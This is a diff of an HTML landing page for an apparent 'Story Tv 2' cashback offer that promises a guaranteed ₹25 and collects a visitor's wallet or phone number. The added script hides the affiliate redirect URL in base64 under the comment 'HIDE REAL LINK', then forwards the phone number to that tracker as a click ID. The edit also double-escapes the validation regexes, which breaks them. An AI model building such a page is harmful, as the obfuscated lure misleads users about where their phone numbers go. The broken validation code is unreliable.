@@ -27,24 +27,24 @@ body{
 
 .card{
   background:#fff;
-  border-radius:24px;
+  border-radius:26px;
   padding:24px;
   max-width:420px;
   width:100%;
-  box-shadow:0 8px 32px rgba(0,0,0,0.10);
+  box-shadow:0 10px 35px rgba(0,0,0,0.08);
 }
 
 .header{
   display:flex;
   align-items:center;
   gap:14px;
-  margin-bottom:20px;
+  margin-bottom:22px;
 }
 
 .app-icon{
-  width:64px;
-  height:64px;
-  border-radius:16px;
+  width:72px;
+  height:72px;
+  border-radius:20px;
   overflow:hidden;
   flex-shrink:0;
 }
@@ -56,22 +56,22 @@ body{
 }
 
 .header-text h1{
-  font-size:22px;
+  font-size:24px;
   font-weight:900;
-  color:#1a1a2e;
+  color:#17182b;
 }
 
 .header-text p{
-  font-size:13px;
-  color:#888;
-  font-weight:600;
+  font-size:14px;
+  color:#8b8b98;
+  font-weight:700;
 }
 
 .cashback-box{
   background:linear-gradient(135deg,#1976d2,#42a5f5);
-  border-radius:18px;
-  padding:20px;
-  margin-bottom:20px;
+  border-radius:22px;
+  padding:24px;
+  margin-bottom:22px;
   position:relative;
   overflow:hidden;
 }
@@ -79,38 +79,38 @@ body{
 .cashback-box::after{
   content:'';
   position:absolute;
-  right:-20px;
-  top:-20px;
-  width:120px;
-  height:120px;
-  background:rgba(255,255,255,0.1);
+  right:-25px;
+  top:-25px;
+  width:140px;
+  height:140px;
+  background:rgba(255,255,255,0.10);
   border-radius:50%;
 }
 
 .cashback-label{
-  font-size:11px;
+  font-size:12px;
   font-weight:800;
   color:rgba(255,255,255,0.8);
-  letter-spacing:1.5px;
+  letter-spacing:2px;
   text-transform:uppercase;
-  margin-bottom:6px;
+  margin-bottom:8px;
 }
 
 .cashback-amount{
-  font-size:48px;
+  font-size:60px;
   font-weight:900;
   color:#fff;
   line-height:1;
-  margin-bottom:12px;
+  margin-bottom:16px;
 }
 
 .cashback-amount span{
-  font-size:28px;
+  font-size:34px;
 }
 
 .badges{
   display:flex;
-  gap:12px;
+  gap:14px;
   flex-wrap:wrap;
 }
 
@@ -118,8 +118,8 @@ body{
   display:flex;
   align-items:center;
   gap:4px;
-  font-size:12px;
-  font-weight:700;
+  font-size:13px;
+  font-weight:800;
   color:#fff;
 }
 
@@ -132,152 +132,140 @@ body{
   display:flex;
   align-items:center;
   gap:8px;
-  font-size:14px;
-  font-weight:800;
-  color:#1a1a2e;
-  margin-bottom:10px;
+  font-size:15px;
+  font-weight:900;
+  color:#17182b;
+  margin-bottom:12px;
 }
 
 .phone-input{
   width:100%;
-  padding:14px 18px;
-  border:2px solid #e8ecf4;
-  border-radius:14px;
-  font-size:15px;
+  padding:18px 18px;
+  border:none;
+  border-radius:18px;
+  font-size:18px;
   font-family:'Nunito',sans-serif;
-  font-weight:700;
-  color:#1a1a2e;
+  font-weight:800;
+  color:#17182b;
   outline:none;
-  transition:border-color 0.2s;
-  background:#f8f9ff;
-}
-
-.phone-input:focus{
-  border-color:#2196f3;
-  background:#fff;
+  background:#eef2fb;
+  margin-bottom:14px;
 }
 
 .phone-input::placeholder{
-  color:#bbb;
-  font-weight:600;
+  color:#b0b4c3;
 }
 
 .submit-btn{
   width:100%;
-  padding:16px;
+  padding:18px;
   background:linear-gradient(135deg,#1976d2,#42a5f5);
   color:#fff;
   border:none;
-  border-radius:14px;
-  font-size:16px;
+  border-radius:18px;
+  font-size:20px;
   font-weight:900;
   font-family:'Nunito',sans-serif;
   cursor:pointer;
-  letter-spacing:1px;
-  transition:all 0.2s;
-  box-shadow:0 4px 18px rgba(33,150,243,0.45);
-  margin-top:12px;
-}
-
-.submit-btn:hover{
-  transform:translateY(-2px);
+  letter-spacing:2px;
+  box-shadow:0 10px 25px rgba(33,150,243,0.35);
 }
 
 .error-msg{
-  color:#e53935;
+  color:#ff3b30;
   font-size:13px;
-  font-weight:700;
-  margin-top:8px;
+  font-weight:800;
+  margin-bottom:10px;
   display:none;
 }
 
 .divider{
   height:1px;
-  background:#f0f0f0;
-  margin:20px 0;
+  background:#ededed;
+  margin:26px 0;
 }
 
 .steps-title{
   display:flex;
   align-items:center;
   gap:8px;
-  font-size:15px;
-  font-weight:800;
-  color:#1a1a2e;
-  margin-bottom:16px;
+  font-size:17px;
+  font-weight:900;
+  color:#17182b;
+  margin-bottom:18px;
 }
 
 .step{
   display:flex;
   align-items:flex-start;
-  gap:12px;
-  margin-bottom:14px;
+  gap:14px;
+  margin-bottom:16px;
 }
 
 .step-num{
+  width:34px;
+  height:34px;
+  border-radius:10px;
   background:#1976d2;
   color:#fff;
-  width:28px;
-  height:28px;
-  border-radius:8px;
   display:flex;
   align-items:center;
   justify-content:center;
-  font-size:13px;
+  font-size:16px;
   font-weight:900;
   flex-shrink:0;
-  margin-top:1px;
 }
 
 .step-text{
-  font-size:14px;
-  font-weight:700;
+  font-size:15px;
+  font-weight:800;
   color:#333;
-  line-height:1.4;
+  line-height:1.5;
 }
 
-.step-text .highlight{
-  background:#e3f2fd;
+.highlight{
+  background:#e5f1ff;
   color:#1976d2;
-  padding:2px 8px;
+  padding:3px 10px;
   border-radius:20px;
-  font-weight:800;
+  font-weight:900;
 }
 
 .powered{
   text-align:center;
-  margin-top:20px;
-  font-size:12px;
-  color:#bbb;
-  font-weight:700;
+  margin-top:22px;
+  font-size:13px;
+  color:#b4b4b4;
+  font-weight:800;
 }
 
 .powered span{
-  color:#2196f3;
+  color:#1976d2;
 }
 
-/* SUCCESS TOAST */
+/* CAMPBOLT STYLE TOAST */
 
 .success-toast{
   position:fixed;
-  top:95px;
+  top:82px;
   left:50%;
-  transform:translateX(-50%) translateY(-100px);
-  background:#ffffff;
-  border-radius:22px;
-  padding:16px 18px;
+  transform:translateX(-50%) translateY(-120px);
+  width:86%;
+  max-width:350px;
+  background:#fff;
+  border-radius:28px;
+  padding:18px;
   display:flex;
   align-items:center;
-  gap:14px;
-  min-width:300px;
-  max-width:340px;
-  box-shadow:
-    0 12px 35px rgba(33,150,243,0.22),
-    0 4px 12px rgba(0,0,0,0.08);
-  z-index:9999;
+  gap:16px;
+  z-index:99999;
   opacity:0;
+
+  box-shadow:
+  0 18px 40px rgba(0,0,0,0.10),
+  0 4px 12px rgba(0,0,0,0.05);
+
   transition:all .45s cubic-bezier(.22,1,.36,1);
-  border:1px solid rgba(33,150,243,0.08);
 }
 
 .success-toast.show{
@@ -285,40 +273,43 @@ body{
   transform:translateX(-50%) translateY(0);
 }
 
-.toast-icon{
-  width:50px;
-  height:50px;
-  border-radius:16px;
-  background:linear-gradient(135deg,#00d26a,#4dff9f);
+.toast-check{
+  width:60px;
+  height:60px;
+  min-width:60px;
+  border-radius:18px;
+  background:linear-gradient(135deg,#15d85e,#36f37f);
+
   display:flex;
   align-items:center;
   justify-content:center;
+
   color:#fff;
-  font-size:24px;
+  font-size:32px;
   font-weight:900;
-  flex-shrink:0;
-  box-shadow:0 6px 18px rgba(0,210,106,0.35);
+
+  box-shadow:0 10px 22px rgba(21,216,94,0.30);
 }
 
 .toast-title{
-  font-size:17px;
+  font-size:20px;
   font-weight:900;
   color:#111827;
-  margin-bottom:2px;
+  margin-bottom:4px;
 }
 
-.toast-text{
-  font-size:14px;
+.toast-subtitle{
+  font-size:15px;
   font-weight:700;
-  color:#5f6368;
-  line-height:1.4;
+  color:#7b8190;
 }
 
-@keyframes toastPop{
+@keyframes campboltToast{
   0%{
     opacity:0;
-    transform:translateX(-50%) translateY(-25px) scale(.88);
+    transform:translateX(-50%) translateY(-35px) scale(.88);
   }
+
   100%{
     opacity:1;
     transform:translateX(-50%) translateY(0) scale(1);
@@ -326,7 +317,7 @@ body{
 }
 
 .success-toast.show{
-  animation:toastPop .45s cubic-bezier(.22,1,.36,1);
+  animation:campboltToast .45s cubic-bezier(.22,1,.36,1);
 }
 
 </style>
@@ -337,6 +328,7 @@ body{
 <div class="card">
 
   <div class="header">
+
     <div class="app-icon">
       <img src="https://i.ibb.co/chVHHvZp/images.png">
     </div>
@@ -345,10 +337,14 @@ body{
       <h1>Story Tv 2</h1>
       <p>Complete & earn instantly</p>
     </div>
+
   </div>
 
   <div class="cashback-box">
-    <div class="cashback-label">TOTAL CASHBACK</div>
+
+    <div class="cashback-label">
+      TOTAL CASHBACK
+    </div>
 
     <div class="cashback-amount">
       <span>₹</span>25
@@ -359,10 +355,11 @@ body{
       <div class="badge">Guaranteed</div>
       <div class="badge">Secure</div>
     </div>
+
   </div>
 
   <div class="form-label">
-    <span>💳</span> Wallet Number
+    💳 Wallet Number
   </div>
 
   <input
@@ -418,7 +415,7 @@ body{
   </div>
 
   <div class="powered">
-    Powered by <span>CashFlix ⚡</span>
+    Powered by <span>TrackFlix ⚡</span>
   </div>
 
 </div>
@@ -427,18 +424,20 @@ body{
 
 <div class="success-toast" id="successToast">
 
-  <div class="toast-icon">
+  <div class="toast-check">
     ✓
   </div>
 
-  <div class="toast-content">
+  <div class="toast-info">
+
     <div class="toast-title">
       Success!
     </div>
 
-    <div class="toast-text">
-      Redirecting! You now...
+    <div class="toast-subtitle">
+      Redirecting you now...
     </div>
+
   </div>
 
 </div>
@@ -450,40 +449,51 @@ function handleSubmit(){
   const phone = document.getElementById('phoneInput').value.trim();
   const errorMsg = document.getElementById('errorMsg');
 
-  if(!/^[6-9]\d{9}$/.test(phone)){
+  if(!/^[6-9]\\d{9}$/.test(phone)){
     errorMsg.style.display = 'block';
     return;
   }
 
   errorMsg.style.display = 'none';
 
-  // SHOW TOAST
+  // SHOW CAMPBOLT STYLE TOAST
 
   const toast = document.getElementById('successToast');
 
   toast.classList.add('show');
 
+  // HIDE REAL LINK
+
+  const hiddenLink =
+    atob('aHR0cHM6Ly9wdWJsaXNoZXIuYXBuYWNhc2h5LnNpdGUvYy8/bz0xNyZhPTE1');
+
   // REDIRECT
 
   setTimeout(() => {
 
-    const link =
-      'https://publisher.apnacashy.site/c/?o=17&a=15&aff_click_id='
-      + phone +
-      '&sub_aff_id=' + phone +
-      '&offer=StoryTv2';
+    window.location.replace(
+      hiddenLink +
+      '&aff_click_id=' + encodeURIComponent(phone) +
+      '&sub_aff_id=' + encodeURIComponent(phone) +
+      '&offer=StoryTv2'
+    );
 
-    window.location.href = link;
+  }, 1700);
 
-  }, 1800);
 }
 
-document.getElementById('phoneInput').addEventListener('keypress', function(e){
-  if(e.key === 'Enter') handleSubmit();
+document.getElementById('phoneInput').addEventListener('keypress',function(e){
+
+  if(e.key === 'Enter'){
+    handleSubmit();
+  }
+
 });
 
-document.getElementById('phoneInput').addEventListener('input', function(){
-  this.value = this.value.replace(/\D/g,'');
+document.getElementById('phoneInput').addEventListener('input',function(){
+
+  this.value = this.value.replace(/\\D/g,'');
+
 });
 
 </script>
